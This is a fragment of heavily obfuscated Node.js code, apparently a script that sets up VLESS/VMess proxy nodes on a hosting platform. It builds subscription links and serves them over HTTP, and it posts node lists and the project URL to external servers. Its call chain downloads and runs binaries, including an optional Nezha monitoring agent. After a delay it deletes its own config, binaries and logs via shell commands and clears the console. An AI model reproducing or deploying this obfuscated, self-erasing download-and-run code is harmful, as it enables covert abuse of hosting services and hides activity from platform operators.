_0x3c7de1[_0x5c6512(_0x2c272b._0x173f8f)][_0x5c6512(0x1e6)]+'_'+_0x3c7de1[_0x5c6512(_0x2c272b._0x36e249)]['org'];}catch(_0xdbb531){}}return _0x5c6512(0x19d);}async function _0xf6c6a9(_0x327f7c){const _0x14e0ad=await _0x1a43b6(),_0x5b39a9=NAME?NAME+'-'+_0x14e0ad:_0x14e0ad;return new Promise(_0x2187f8=>{const _0xe20db8={_0x5189f4:0x1a7,_0x533d89:0x200,_0x1a7257:0x1d0,_0x3907ee:0x1af,_0x135ddc:0x19a,_0x11c3f8:0x197,_0x3342b1:0x23d,_0xe9983c:0x219,_0x3455d6:0x197,_0xf8f1bb:0x219,_0xd4a4dc:0x23e,_0x3abd17:0x1d6},_0x5d7025={_0x184a87:0x19a,_0x50b4ef:0x197,_0x32fa14:0x1cd};setTimeout(()=>{const _0x5b73ec=_0x10d8,_0x29827c={'v':'2','ps':''+_0x5b39a9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5b73ec(_0xe20db8._0x5189f4),'net':'ws','type':_0x5b73ec(0x1a7),'host':_0x327f7c,'path':_0x5b73ec(0x1cb),'tls':_0x5b73ec(_0xe20db8._0x533d89),'sni':_0x327f7c,'alpn':'','fp':_0x5b73ec(0x1e5)},_0x536661='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5b73ec(_0xe20db8._0x1a7257)+_0x327f7c+_0x5b73ec(_0xe20db8._0x3907ee)+_0x327f7c+_0x5b73ec(0x1b6)+_0x5b39a9+'\x0a\x0avmess://'+Buffer[_0x5b73ec(_0xe20db8._0x135ddc)](JSON['stringify'](_0x29827c))[_0x5b73ec(_0xe20db8._0x11c3f8)]('base64')+_0x5b73ec(0x1d5)+UUID+'@'+CFIP+':'+CFPORT+_0x5b73ec(0x249)+_0x327f7c+_0x5b73ec(0x1af)+_0x327f7c+_0x5b73ec(0x1c9)+_0x5b39a9+_0x5b73ec(_0xe20db8._0x3342b1);console[_0x5b73ec(0x23e)](Buffer[_0x5b73ec(0x19a)](_0x536661)[_0x5b73ec(0x197)](_0x5b73ec(_0xe20db8._0xe9983c))),fs[_0x5b73ec(0x251)](subPath,Buffer[_0x5b73ec(0x19a)](_0x536661)[_0x5b73ec(_0xe20db8._0x3455d6)](_0x5b73ec(_0xe20db8._0xf8f1bb))),console[_0x5b73ec(_0xe20db8._0xd4a4dc)](FILE_PATH+_0x5b73ec(_0xe20db8._0x3abd17)),uploadNodes(),app[_0x5b73ec(0x24e)]('/'+SUB_PATH,(_0xdaae52,_0x300096)=>{const _0x1821b8=_0x5b73ec,_0x165f54=Buffer[_0x1821b8(_0x5d7025._0x184a87)](_0x536661)[_0x1821b8(_0x5d7025._0x50b4ef)]('base64');_0x300096[_0x1821b8(0x1f2)]('Content-Type',_0x1821b8(0x238)),_0x300096[_0x1821b8(_0x5d7025._0x32fa14)](_0x165f54);}),_0x2187f8(_0x536661);},0x7d0);});}}async function uploadNodes(){const _0x1cad11={_0x2cb700:0x235,_0x5dedfc:0x216,_0x2a6dc9:0x208,_0x28d236:0x1bc,_0x43a9ae:0x237,_0x17f2f7:0x247,_0x117f6b:0x1b4},_0x5a7f52=_0x50491f;if(UPLOAD_URL&&PROJECT_URL){const _0x2ccc2f=PROJECT_URL+'/'+SUB_PATH,_0xf54850={'subscription':[_0x2ccc2f]};try{const _0xb8c604=await axios[_0x5a7f52(0x212)](UPLOAD_URL+'/api/add-subscriptions',_0xf54850,{'headers':{'Content-Type':_0x5a7f52(0x18c)}});return _0xb8c604&&_0xb8c604['status']===0xc8?(console['log'](_0x5a7f52(_0x1cad11._0x2cb700)),_0xb8c604):null;}catch(_0x38f8a3){if(_0x38f8a3[_0x5a7f52(0x216)]){if(_0x38f8a3[_0x5a7f52(_0x1cad11._0x5dedfc)][_0x5a7f52(0x1ab)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5a7f52(0x1ad)](listPath))return;const _0x27ce07=fs[_0x5a7f52(0x1ac)](listPath,_0x5a7f52(0x1c4)),_0x4994a9=_0x27ce07[_0x5a7f52(_0x1cad11._0x2a6dc9)]('\x0a')[_0x5a7f52(_0x1cad11._0x28d236)](_0x25c36a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5a7f52(0x252)](_0x25c36a));if(_0x4994a9[_0x5a7f52(_0x1cad11._0x43a9ae)]===0x0)return;const _0x91703d=JSON[_0x5a7f52(_0x1cad11._0x17f2f7)]({'nodes':_0x4994a9});try{const _0x3b7547=await axios[_0x5a7f52(0x212)](UPLOAD_URL+_0x5a7f52(0x19e),_0x91703d,{'headers':{'Content-Type':_0x5a7f52(0x18c)}});return _0x3b7547&&_0x3b7547[_0x5a7f52(0x1ab)]===0xc8?(console[_0x5a7f52(0x23e)](_0x5a7f52(_0x1cad11._0x117f6b)),_0x3b7547):null;}catch(_0x3f205e){return null;}}else return;}}function cleanFiles(){const _0x28db07={_0x3f2bf3:0x18e,_0x319a8d:0x223,_0x1bc928:0x1d8,_0x3f0fbe:0x218},_0x4984cd={_0x2e32ad:0x23e,_0x1921a4:0x23e};setTimeout(()=>{const _0x40056c={_0x2ecfb1:0x23e,_0x46e29a:0x20c},_0x21f827=_0x10d8,_0x3d302d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3d302d['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3d302d[_0x21f827(0x21d)](phpPath);process[_0x21f827(_0x28db07._0x3f2bf3)]===_0x21f827(_0x28db07._0x319a8d)?exec(_0x21f827(0x211)+_0x3d302d[_0x21f827(_0x28db07._0x1bc928)]('\x20')+_0x21f827(0x24f),_0x5a8a1c=>{const _0x1ceac4=_0x21f827;console[_0x1ceac4(0x21a)](),console[_0x1ceac4(_0x4984cd._0x2e32ad)]('App\x20is\x20running'),console[_0x1ceac4(_0x4984cd._0x1921a4)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x21f827(_0x28db07._0x3f0fbe)+_0x3d302d['join']('\x20')+_0x21f827(0x253),_0x232a39=>{const _0x5139d7=_0x21f827;console['clear'](),console[_0x5139d7(_0x40056c._0x2ecfb1)](_0x5139d7(0x20e)),console['log'](_0x5139d7(_0x40056c._0x46e29a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1c2fca={_0x3d6485:0x18c,_0x108bd2:0x1a0,_0x4e1af1:0x1a8},_0x239241=_0x50491f;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x239241(0x23c));return;}try{const _0x23cd2b=await axios[_0x239241(0x212)](_0x239241(0x205),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x239241(_0x1c2fca._0x3d6485)}});return console[_0x239241(0x23e)](_0x239241(_0x1c2fca._0x108bd2)),_0x23cd2b;}catch(_0x5d864c){return console['error'](_0x239241(0x23f)+_0x5d864c[_0x239241(_0x1c2fca._0x4e1af1)]),null;}}async function startserver(){const _0x2177db=_0x50491f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x425adc){console['error'](_0x2177db(0x24a),_0x425adc);}}startserver()[_0x50491f(0x24c)](_0x5b2f2b=>{const _0x3c47a1=_0x50491f;console['error'](_0x3c47a1(0x217),_0x5b2f2b);}),app[_0x50491f(0x1e3)](PORT,()=>console[_0x50491f(0x23e)](_0x50491f(0x248)+PORT+'!'));
